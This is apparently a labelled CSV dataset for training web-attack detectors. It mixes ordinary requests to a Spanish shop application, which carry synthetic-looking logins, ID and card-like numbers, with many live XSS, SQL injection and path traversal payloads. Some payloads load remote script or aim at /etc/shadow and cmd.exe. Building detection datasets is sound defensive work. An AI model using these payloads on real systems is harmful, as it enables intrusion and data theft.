publico/autenticar.jsp?modo=entrar&login=alexio&pwd=biZarRO&remember=off&B1=Entrar,normal,0.088387565
miembros/imagenes/zarauz.jpg,normal,0.075734592
imagenes/logo.gif,normal,0.860843412
publico/miembros.jsp,normal,0.805088843
<script>alert(1);</script>,xss,0.424257368
imagenes/logo.gif,normal,0.933182598
..\..\..\..\..\{FILE},traversal,0.218190162
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss,0.855171478
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;""></BODY></HTML>",xss,0.613709609
' -- &password=,sqli,0.659544362
global/estilos.css,normal,0.304312548
miembros/index.jsp,normal,0.410143321
publico/miembros.jsp,normal,0.731504938
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",xss,0.08125438
imagenes/3.gif,normal,0.42180048
..//..//..//..//..//..//{FILE},traversal,0.723817535
..\..\\..\{FILE},traversal,0.914977317
imagenes/1.gif,normal,0.05662897
publico/registro.jsp?modo=registro&login=souren&password=P811S25&nombre=Sisebuto&apellidos=Fincias+Alcoriza&email=diccico_pastor%40a%F1o09.io&dni=80914738W&direccion=C%2F+Altamira+179%2C+&ciudad=Almaluez&cp=45789&provincia=Sevilla&ntc=1714562160313645&B1=Registrar,normal,0.480039399
imagenes/logo.gif,normal,0.470834478
publico/pagar.jsp?modo=insertar&precio=1096&B1=Confirmar,normal,0.633532383
imagenes/1.gif,normal,0.873030646
miembros/imagenes/zarauz.jpg,normal,0.374877866
publico/pagar.jsp?modo=insertar&precio=9398&B1=Pasar+por+caja,normal,0.637193867
"<a href=""javascript:javascript:alert(1)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"">",xss,0.74639642
imagenes/cmenbul.gif,normal,0.659983835
global/creditos.jsp,normal,0.775290288
miembros/fotos.jsp,normal,0.076128979
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.13565137
..//..//..//..//..//..//..//{FILE},traversal,0.463556839
publico/miembros.jsp,normal,0.345336781
miembros/imagenes/ogono.jpg,normal,0.478603845
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},traversal,0.221774583
publico/autenticar.jsp?modo=entrar&login=bergland&pwd=85amo&remember=on&B1=Entrar,normal,0.477659815
<script>javascript:alert(1)<\x00/script>,xss,0.658008217
"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",xss,0.857798002
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=96&B1=A%F1adir+al+carrito,normal,0.22370649
"<svg xmlns=""#""><script>alert(1)</script></svg>",xss,0.146226029
imagenes/3.gif,normal,0.736600606
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss,0.14521899
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,traversal,0.650383667
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.927119637
miembros/imagenes/castro.jpg,normal,0.070746586
miembros/salir.jsp,normal,0.196157977
/..\/..\/..\/..\/..\/..\{FILE},traversal,0.954883602
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,traversal,0.565944674
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE},traversal,0.258116077
miembros/editar.jsp?modo=registro&login=forslund&password=im%24ponderable&nombre=Ravid&apellidos=Bonany+Lambarri&email=lightnin%40grupodescansoyhogar.web&dni=70679983V&direccion=Calle+Barrio+Villayuda+169%2C+&ciudad=Ari%F1o&cp=08170&provincia=Segovia&ntc=0664227829030755&B1=Registrar,normal,0.261168002
global/estilos.css,normal,0.290912092
"<a href=""\xE1\x9A\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.542355813
/..\../..\../..\../..\../..\../..\../etc/passwd,traversal,0.939753279
"<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d",xss,0.291409692
imagenes/2.gif,normal,0.625692588
publico/registro.jsp?modo=registro&login=caleta&password=carminante&nombre=Reinaldo&apellidos=Homs+Breither&email=patric_congregation%40annoyanc.zr&dni=54180440F&direccion=Calle+Jabera%2C+27%2C+&ciudad=Fuentes+Calientes&cp=47185&provincia=Valencia&ntc=9828908323300958&B1=Registrar,normal,0.768581632
publico/autenticar.jsp?modo=entrar&login=mcallum&pwd=garabero&remember=off&B1=Entrar,normal,0.096062545
"`""'><img src=xxx:x onerror\x09=javascript:alert(1)>",xss,0.477214933
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.469327538
publico/pagar.jsp?modo=insertar&precio=2993&B1=Pasar+por+caja,normal,0.21770113
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=94&B1=A%F1adir+al+carrito,normal,0.34294828
"admin"") or ""1""=""1""#",sqli,0.423813987
"so,s: select * from users where id=1 or ""%,"" or 1=1 -- 1",sqli,0.830734378
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE},traversal,0.026411057
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE},traversal,0.775168122
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.572808541
"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",xss,0.976464577
publico/miembros.jsp,normal,0.175962869
miembros/index.jsp,normal,0.826484177
"<iframe %00 src=""&Tab;javascript:prompt(1)&Tab;""%00>",xss,0.196693778
global/estilos.css,normal,0.182797927
admin' or ',sqli,0.50291409
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},traversal,0.003770045
"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",xss,0.713970321
publico/productos.jsp,normal,0.31113712
imagenes/3.gif,normal,0.065717744
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},traversal,0.210808108
miembros/imagenes/ogono.jpg,normal,0.165781795
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.88400676
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal,0.430832364
publico/autenticar.jsp?modo=entrar&login=westgart&pwd=embo4ina80&remember=on&B1=Entrar,normal,0.160025787
miembros/imagenes/castro.jpg,normal,0.590191121
publico/caracteristicas.jsp?id=1,normal,0.566829479
miembros/imagenes/ogono.jpg,normal,0.722468503
publico/pagar.jsp?modo=insertar&precio=2672&B1=Pasar+por+caja,normal,0.562382141
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.848452686
publico/registro.jsp?modo=registro&login=pafilis&password=d895ra8&nombre=Anan%EDas&apellidos=Zamarroni+Aburto&email=spaeth%40directoriogratuito.kr&dni=97228883V&direccion=Cami+Del+Fredolic+115+&ciudad=Ginebrosa%2C+La&cp=04458&provincia=Cuenca&ntc=2912546166098887&B1=Registrar,normal,0.240996293
imagenes/logo.gif,normal,0.869094954
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss,0.234079815
publico/productos.jsp,normal,0.881223277
publico/productos.jsp,normal,0.859257169
http://www.google<script .com>alert(document.location)</script,xss,0.277191886
"&lt;A HREF=\""http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\""&gt;XSS&lt;/A&gt;",xss,0.177648015
imagenes/nuestratierra.jpg,normal,0.089834183
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,0.195085392
global/menum.jsp,normal,0.927170853
"s;1s: select * from users where id=1 or "";1"" or 1=1 -- 1",sqli,0.077939636
%3cscript%3ealert('XSS')%3c/script%3e,xss,0.270858456
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss,0.797964595
"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",xss,0.009598106
global/estilos.css,normal,0.992043846
"<iframe src=""javascript:document.vulnerable=true; <",xss,0.696721754
miembros/imagenes/ogono.jpg,normal,0.017346047
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.954297269
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",sqli,0.809948469
"son.U: select * from users where id='1' + $ . union select 1,@@VERSION -- 1'",sqli,0.070500567
publico/pagar.jsp?modo=insertar&precio=8164&B1=Pasar+por+caja,normal,0.199749796
miembros/editar.jsp?modo=registro&login=karola5&password=conciliador&nombre=Pampa&apellidos=Donadieu+Zanotti&email=zoldou%40stainless.tw&dni=88253355D&direccion=Ecija+51+12-H&ciudad=Cigales&cp=50549&provincia=Zaragoza&ntc=0445247977004873&B1=Registrar,normal,0.955133732
..\\{FILE},traversal,0.228013562
"s.ns: select * from users where id=1 or ""._"" or 1=1 -- 1",sqli,0.582565136
imagenes/logo.gif,normal,0.196913971
publico/caracteristicas.jsp?id=1,normal,0.303875988
imagenes/logo.gif,normal,0.775144896
global/creditos.jsp,normal,0.017199616
"<script src=""data:\xD4\x8F,javascript:alert(1)""></script>",xss,0.063448391
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},traversal,0.656705613
publico/productos.jsp,normal,0.247702494
global/creditos.jsp,normal,0.160761209
miembros/imagenes/ogono.jpg,normal,0.131061552
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",sqli,0.766952213
publico/productos.jsp,normal,0.262081437
global/estilos.css,normal,0.349851424
publico/carrito.jsp,normal,0.911958053
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},traversal,0.522396541
publico/autenticar.jsp?modo=entrar&login=lar&pwd=t2naja&remember=on&B1=Entrar,normal,0.069907519
global/titulo.jsp,normal,0.360139323
"\"";alert('XSS');//",xss,0.367251165
publico/caracteristicas.jsp?id=2,normal,0.585445267
global/menum.jsp,normal,0.955300933
miembros/imagenes/ogono.jpg,normal,0.08450449
miembros/fotos.jsp,normal,0.848864653
publico/caracteristicas.jsp?id=1,normal,0.344972114
miembros/imagenes/ogono.jpg,normal,0.346042839
miembros/fotos.jsp,normal,0.550872876
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.041393795
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss,0.2998565
miembros/editar.jsp?modo=registro&login=mcarthur&password=g53ON3a9u56&nombre=Efra%EDn&apellidos=Virhuez+Prats&email=sripatimakul%40forohh.ic&dni=08968667R&direccion=Camino+El+Pino%2C+151%2C+5-B&ciudad=Argujillo&cp=39450&provincia=Badajoz&ntc=7202990502846857&B1=Registrar,normal,0.772663888
miembros/imagenes/castro.jpg,normal,0.39842227
"soc: select * from users where id='1' + @<@# union select 1,version() -- 1'",sqli,0.459691618
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",xss,0.345256819
publico/productos.jsp,normal,0.677157167
""" or """"^""",sqli,0.882726589
imagenes/nuestratierra.jpg,normal,0.180663671
'sqlvuln,sqli,0.263712409
global/creditos.jsp,normal,0.563399931
<script src=%(jscript)s></script>,xss,0.60854802
/./././././././././././etc/shadow,traversal,0.268914183
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.071102269
..../..../..../{FILE},traversal,0.06936746
imagenes/2.gif,normal,0.078195624
imagenes/2.gif,normal,0.600868169
"<form><button formaction=""javascript:javascript:alert(1)"">X",xss,0.517493449
%2e%68%74%61%63%63%65%73%73,traversal,0.946966431
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=6&B1=A%F1adir+al+carrito,normal,0.89733118
index.jsp,normal,0.045975955
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\{FILE},traversal,0.334218813
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.473473353
index.jsp,normal,0.343611814
../..//../..///{FILE},traversal,0.635498436
<iframe src=%(scriptlet)s <,xss,0.111589774
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal,0.121023646
publico/caracteristicas.jsp?id=2,normal,0.654253641
global/titulo.jsp,normal,0.459562404
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,xss,0.801328058
imagenes/cmenbul.gif,normal,0.76256958
miembros/index.jsp,normal,0.659626359
"&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\""XSS\"");&lt;/SCRIPT&gt;",xss,0.20115896
"`""'><img src=xxx:x \x2Fonerror=javascript:alert(1)>",xss,0.670103884
miembros/editar.jsp?modo=registro&login=raul&password=8a92rique46&nombre=Wido&apellidos=Romero+Pereyra&email=macdougall_laurier%40rocofer.am&dni=34481916V&direccion=C%2F+San+Francisco%2C+45+&ciudad=Casasola+de+Ari%F3n&cp=34259&provincia=Madrid&ntc=0592934033194730&B1=Registrar,normal,0.028433251
..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE},traversal,0.090863996
"sv?s: select * from users where id=1 or ""@?"" or 1=1 -- 1",sqli,0.972605264
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=15&B1=A%F1adir+al+carrito,normal,0.644948387
publico/pagar.jsp?modo=insertar&precio=6684&B1=Pasar+por+caja,normal,0.896858733
' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,sqli,0.603437549
"<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>",xss,0.767556335
miembros/imagenes/zarauz.jpg,normal,0.967144922
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss,0.639626597
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.08605801
"<a href=""\x02javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.289627908
publico/productos.jsp,normal,0.829445632
publico/carrito.jsp,normal,0.372755401
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",xss,0.113074124
publico/miembros.jsp,normal,0.432582188
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,xss,0.653995745
publico/carrito.jsp,normal,0.733267001
index.jsp,normal,0.788732094
imagenes/3.gif,normal,0.82754614
"&lt;FRAMESET&gt;&lt;FRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/FRAMESET&gt;",xss,0.649496531
..%5c{FILE},traversal,0.90985311
"<xml src=""javascript:document.vulnerable=true;"">",xss,0.889318208
publico/pagar.jsp?modo=insertar&precio=8019&B1=Confirmar,normal,0.149104009
global/titulo.jsp,normal,0.182098516
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;""></BODY></HTML>",xss,0.281080836
miembros/index.jsp,normal,0.609888249
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss,0.801641638
index.jsp,normal,0.518099909
<;IMG SRC=javascript:alert(&;quot;XSS&;quot;)>;,xss,0.139296809
imagenes/3.gif,normal,0.84304886
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss,0.860085927
index.jsp,normal,0.628753611
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss,0.884994011
publico/autenticar.jsp?modo=entrar&login=harrell&pwd=garruler%EDa&remember=off&B1=Entrar,normal,0.68150615
%uff0e%uff0e\{FILE},traversal,0.335347358
miembros/editar.jsp?modo=registro&login=yaeger&password=c%21andeleta&nombre=Claudio&apellidos=Cazallas+Caminal&email=reaves-phillips%40baybay.tm&dni=58783501D&direccion=Avinguda+De+La+Reina+Maria+Cristina+174+2%3FB&ciudad=Mesas%2C+Las&cp=44220&provincia=Badajoz&ntc=2524414881203627&B1=Registrar,normal,0.545746784
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.685414067
publico/miembros.jsp,normal,0.597349905
miembros/imagenes/castro.jpg,normal,0.314368137
<iframe/onreadystatechange=alert(1),xss,0.304848744
publico/caracteristicas.jsp?id=1,normal,0.750911799
publico/registro.jsp?modo=registro&login=wookie&password=ven1no&nombre=Nicanora&apellidos=Laborin+Arancibia&email=goring%40quadernideilgarda.pl&dni=94046799Y&direccion=C%2F+Sahagun+142+&ciudad=Vall%E9s&cp=50690&provincia=La+Rioja&ntc=9490117587717675&B1=Registrar,normal,0.110686925
imagenes/2.gif,normal,0.538111955
publico/autenticar.jsp?modo=entrar&login=sadegh&pwd=PataG%F3N&remember=on&B1=Entrar,normal,0.979800678
"<meta HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>document.vulnerable=true</SCRIPT>"">",xss,0.497079688
%252e%252e%252f{FILE},traversal,0.056472489
miembros/imagenes/castro.jpg,normal,0.186097036
publico/miembros.jsp,normal,0.166315684
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.704906069
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss,0.730915438
miembros/imagenes/zarauz.jpg,normal,0.963082009
"`""'><img src='#\x27 onerror=javascript:alert(1)>",xss,0.890755115
publico/autenticar.jsp?modo=entrar&login=smithdea&pwd=lucembu%24rgu%E9s&remember=off&B1=Entrar,normal,0.639150447
publico/autenticar.jsp?modo=entrar&login=maroucho&pwd=d119a&remember=on&B1=Entrar,normal,0.304293957
miembros/salir.jsp,normal,0.271612119
miembros/imagenes/ogono.jpg,normal,0.57957411
publico/miembros.jsp,normal,0.41463722
imagenes/cmenbul.gif,normal,0.527736435
""" or ""a""=""a",sqli,0.9711606
imagenes/nuestratierra.jpg,normal,0.1643865
"ABC<div style=""x:exp\x00ression(javascript:alert(1)"">DEF",xss,0.742837314
"'';!--\""&lt;XSS&gt;=&{()}",xss,0.642015616
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss,0.141949901
..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE},traversal,0.000463279
"&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""xss\"" implementation=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\""&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;",xss,0.316775995
publico/carrito.jsp,normal,0.994620463
miembros/salir.jsp,normal,0.609246619
&lt;/br style=a:expression(alert())&gt;,xss,0.303145792
"</script><img/*/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/*/onerror='eval(src)'>",xss,0.695281518
global/titulo.jsp,normal,0.579657546
%00../../../../../../etc/passwd,traversal,0.04607409
"so1s: select * from users where id=1 or ""%1"" or 1=1 -- 1",sqli,0.992953477
publico/miembros.jsp,normal,0.328342289
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;,xss,0.929572606
"<form id=""test"" /><button form=""test"" formaction=""javascript:alert(123)"">TESTHTML5FORMACTION",xss,0.01217718
global/titulo.jsp,normal,0.102199165
imagenes/logo.gif,normal,0.531117189
global/creditos.jsp,normal,0.313122554
..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE},traversal,0.982506438
miembros/imagenes/castro.jpg,normal,0.798134982
x' AND members.email IS NULL; --,sqli,0.739259127
"<;STYLE type="";text/css"";>;BODY{background:url("";javascript:alert(';XSS';)"";)}<;/STYLE>;",xss,0.608115533
publico/autenticar.jsp?modo=entrar&login=buckman&pwd=fALiSCO&remember=off&B1=Entrar,normal,0.73030257
imagenes/nuestratierra.jpg,normal,0.427064247
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE},traversal,0.858966602
<IMG SRC=javascript:alert('XSS')>,xss,0.517238703
"&(1UE: select * from users where id=1 or (\+)=1 union select 1,@@VERSION -- 1",sqli,0.906191628
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,xss,0.785447422
o..&1: select * from users where id=1 <@.. or 1=1 -- 1,sqli,0.207576771
imagenes/logo.gif,normal,0.230212886
imagenes/2.gif,normal,0.400694379
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.797256075
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://www.securitycompass.com/scriptlet.html""></object>",xss,0.861566945
&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;,xss,0.689566966
global/estilos.css,normal,0.427221568
publico/carrito.jsp,normal,0.231952608
@variable,sqli,0.787839651
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,xss,0.161603236
"admin"" --",sqli,0.073486269
miembros/imagenes/ogono.jpg,normal,0.700798086
"<img dynsrc=""javascript:document.vulnerable=true;"">",xss,0.089439306
21%,sqli,0.809923464
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.210819647
imagenes/2.gif,normal,0.943584685
index.jsp,normal,0.439085955
global/estilos.css,normal,0.400399067
imagenes/cmenbul.gif,normal,0.854005898
"&ovUE: select * from users where id=1 or !<@ union select 1,version() -- 1",sqli,0.846841583
"<a href=""about:<script>document.vulnerable=true;</script>"">",xss,0.815233237
\../\../\../\../\../\../\../{FILE},traversal,0.614834073
"<div style=""behaviour: url([link to code]);"">",xss,0.077648659
&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;,xss,0.452360275
miembros/editar.jsp?modo=registro&login=murdoch&password=atalaya&nombre=Filem%F3n&apellidos=Urgel&email=raina.schiavelli%40hosterialasmajadillas.de&dni=24244793X&direccion=Pl.+De+Monteleon+60%2C+&ciudad=Benavente&cp=17732&provincia=Valladolid&ntc=0957098737909112&B1=Registrar,normal,0.621561481
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.659629249
miembros/editar.jsp?modo=registro&login=bolduc&password=p%FAblica&nombre=Alma&apellidos=Suau+Feixa&email=lesire%40masqueclases.gn&dni=18301326L&direccion=Subida+San+Diego+8%2C+13%3FC&ciudad=Villavaquer%EDn&cp=04211&provincia=Teruel&ntc=5800254897479094&B1=Registrar,normal,0.029656746
"snUEv: select * from users where id=1 or 1#""$ union select null,version() -- 1",sqli,0.754668273
"&lt;SCRIPT a=\""&gt;\"" '' SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss,0.972988562
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss,0.835304697
index.jsp,normal,0.824336373
global/titulo.jsp,normal,0.371678544
imagenes/logo.gif,normal,0.987374313
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,traversal,0.357150697
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.699346954
publico/carrito.jsp,normal,0.823821628
global/creditos.jsp,normal,0.257414469
global/estilos.css,normal,0.674126637
C:\boot.ini,traversal,0.542566713
..%uF025..%uF025..%uF025..%uF025{FILE},traversal,0.736566606
""" or true--",sqli,0.065345323
